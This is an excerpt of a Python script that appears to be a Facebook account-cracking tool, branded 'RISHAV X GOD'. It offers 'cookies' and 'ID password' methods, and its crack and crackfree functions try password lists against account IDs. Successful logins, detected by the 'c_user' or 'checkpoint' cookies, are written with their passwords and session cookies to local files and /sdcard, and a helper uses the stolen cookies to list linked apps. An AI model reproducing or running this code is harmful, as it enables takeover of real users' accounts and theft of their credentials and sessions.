...
\033[1;37m----------------------------------------------
 \033[1;37mAUTHOR     : RISHAV X GOD
 \033[1;37mOWNER       :ALONE X GOD
\033[1;37m FACEBOOK   : RISHAV BEB
\033[1;37m FB MA ADD HANNA NABIRSINU HOLA LAA ❤️
 ENJOY MY COMMAND ☺️💐
\033[1;37m----------------------------------------------""")
...
def menu(my_name,my_id):
	...
	os.system('clear')
	banner()
	print(" [\u001b[36m•\033[1;36m] WELCOME     : "+uname)
...
def setting():
	...
	linex()
	print(" [\u001b[36m1\033[1;37m] METHOD 1(COOKIES SYSTEM)")
	print(" [\u001b[36m2\033[1;37m] METHOD 2(ID PASSWORD ONLY)")
	linex()
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r \u001b[37m[RISHAV XWD] {loop}/{len(id)} OK[{H}{ok}\u001b[37m] [{'{:.0%}'.format(loop/float(len(id)))}]  "),
	sys.stdout.flush()
...
'bi_xrwh': 0
    ...
    'viewport-width': '980',
			...
			if "c_user" in ses.cookies.get_dict().keys():
				...
				print(f'\r{P}{H} [RISHAV -OK] {H}{idf}|{pw}\n{P}[{H}COOKIE🍪]{P}\033[1;32m{kuki}')
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
				cek_apk(kuki)
				open('/sdcard/RISHAV -OK.txt', 'a').write( idf+' | '+pw+' | '+kuki+'\n')
				RISHAV (idf,pw,kuki)
				break
			elif "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r{P}[{K}RISHAV -CP{P}] {K}{idf}|{pw}')
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				open('/sdcard/RISHAV -CP.txt', 'a').write( idf+' | '+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
...
def crackfree(idf,pwv):
	global loop,ok,cp
	sys.stdout.write(f"\r {P}[RISHAV-GOD]{P} {P}{loop}{P}/{P}{len(id)}{P} OK{P}[{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
	sys.stdout.flush()
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r{P}{K} [{time.strftime("RISHAV GOD")}-CP] {idf} │ {pw} {P}')
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
				...
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f'\r{P}{H} [{time.strftime("RISHAV GOD")}-OK] {idf} │ {pw} {P}')
...
def cek_apk(kuki):
	...
	try:
		for i in range(len(game)):
			print ("\r%s  \033[32m➛ %s%s"%(P,H,game[i].replace("Added on"," Added on")))
	except AttributeError:
		print ("\r    %s\033[32m cookie invalid"%(M))
	...
	try:
		...
		print ("\r    %s \033[32mcookie invalid"%(M))
#-----------------------[ SYSTEM-CONTROL ]--------------------#
